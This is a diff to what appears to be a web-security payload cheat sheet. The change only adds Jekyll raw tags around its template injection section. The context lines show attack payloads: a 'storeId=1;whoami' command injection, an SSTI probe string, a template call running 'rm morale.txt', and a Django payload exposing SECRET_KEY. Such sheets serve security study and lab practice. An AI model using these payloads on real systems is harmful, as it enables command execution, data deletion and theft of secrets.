@@ -467,6 +467,7 @@ productId=1&storeId=1;whoami
 
 ## Server-side template injection
 ### Note
+{% raw %}
 - Use this to identify template engin: `${{<%[%'"}}%\`
 - ERB: `<%= 7*7 %>`
 - Tornado: `{{ 7*7 }}`
@@ -503,6 +504,7 @@ ${ ex("rm morale.txt") }
 // Server-side template injection with information disclosure via user-supplied objects (django)
 {{settings.SECRET_KEY}}
 ```
+{% endraw %}
 
 ## Path traversal
 ### Notes
